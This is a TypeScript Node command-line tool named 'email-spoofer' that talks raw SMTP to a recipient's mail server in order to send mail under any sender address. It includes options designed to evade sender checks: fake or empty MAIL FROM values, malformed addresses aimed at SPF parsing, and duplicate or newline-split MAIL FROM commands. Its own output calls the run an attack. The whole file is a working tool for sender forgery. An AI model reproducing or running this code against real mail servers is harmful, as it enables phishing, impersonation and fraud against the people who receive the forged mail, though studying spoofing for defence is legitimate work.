#! /usr/bin/env node
import { OptionValues, program } from 'commander';
import dns, { MxRecord } from 'dns';
import figlet from 'figlet';
import gradient from 'gradient-string';
import nanospinner from 'nanospinner';
import net from 'net';

import { generateMessageID } from './message-id.js';

const rainbow = {
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  magenta: '\x1b[35m',
  cyan: '\x1b[36m',
  white: '\x1b[37m',
  space: '     ',
};

program
  .name('email-spoofer')
  .description('CLI tool to send emails from any email address')
  .version(process.env.npm_package_version as string);

program
  .option('-f --from <string>', 'Email address to send from.');
program
  .option('-t --to <string>', 'Email address to send to.');
program
  .option('--cc [string]', 'cc email address.');
program
  .option('--bcc [string]', 'bcc email address.');

program
  .option('--subject [string]', 'Subject of the email.');
program
  .option('--body [string]', 'Body of the email.');

program
  .option(`-s --smtp [string]`, `SMTP server to use. (Default: to email domain)`);
program
  .option('-p --port [number]', 'Port to request.', '25');

program
  .option('--MF [string]', 'Mail from a fake domain.');
program
  .option('--MFE', '(address Mail from a empty address.');
program
  .option('--SPF1 [string]', 'address(.attack.address');
program
  .option('--SPF2 [string]', 'address\'@attack.address');

program
  .option('--MFH [string]', 'Insert two from headers.');
program
  .option('--MFH2 [string]', 'Insert two from headers, one with a new line.');

program.parse();

let spinner = nanospinner.createSpinner(`Preparing attack...`);

export const option: OptionValues = program.opts();
if (option.help) {
  program.help();
}

console.log(gradient.rainbow(figlet.textSync('email-spoofer')));

if (!(option.from && option.to)) {
  console.log('Please provide a from and to email address.');
  program.help();
}

if (!option.smtp) {
  option.smtp = option.to.split('@')[1];
}

dns.resolveMx(option.smtp, (err, address: MxRecord[]) => {
  if (err) {
    console.log('Please check your internet connection.');
    spinner.error();
    process.exit(1);
  }
  const server: string = address[0].exchange;
  const socket = net.createConnection(
    option.port,
    server, () => {
      console.log(`Connected to ${server} on port ${option.port}`);
    });
  const CRLF: string = '\r\n';
  const payload: string[] = [`HELO ${server}`];
  if (option.MF) {
    payload.push(`MAIL FROM: ${option.MF}`);
  } else if (option.MFE) {
    payload.push(`MAIL FROM:<(${option.from}>`);
  } else if (option.SPF1) {
    payload.push(`MAIL FROM:<${option.from}(.${option.SPF1}>`);
  } else if (option.SPF2) {
    payload.push(`MAIL FROM:<${option.from}'@${option.SPF2}>`);
  } else if (option.MFH) {
    payload.push(`MAIL FROM:<${option.MFH}>`);
    payload.push(`MAIL FROM:<${option.from}>`);
  } else if (option.MFH2) {
    payload.push(`MAIL FROM:\n<${option.MFH2}>`);
    payload.push(`MAIL FROM:<${option.from}>`);
  } else {
    payload.push(`MAIL FROM:<${option.from}>`);
  }
  payload.push(`RCPT TO:<${option.to}>`);
  payload.push(`DATA`);
  payload.push(`
To: ${option.to}
From: ${option.from}`);
  if (option.cc) {
    payload[payload.length - 1] += (`Cc: ${option.cc}`);
  }
  if (option.bcc) {
    payload[payload.length - 1] += (`Bcc: ${option.bcc}`);
  }
  payload[payload.length - 1] += (`
Message-ID: <${generateMessageID(option.from.split('@')[1])}>
Subject: ${option.subject}

${option.body}

${CRLF}.`);
  payload.push(`QUIT`);
  let index: number = 0;
  socket.on('data', (data: Buffer) => {
    spinner.success();
    const response: string = data.toString();
    console.log(response);
    if (index < payload.length || payload[index]) {
      socket.write(`${payload[index]}${CRLF} `);
      spinner = nanospinner.createSpinner(`${payload[index]}`).start();
      index++;
    } else {
      spinner.success();
      socket.end();
    }
  });
});
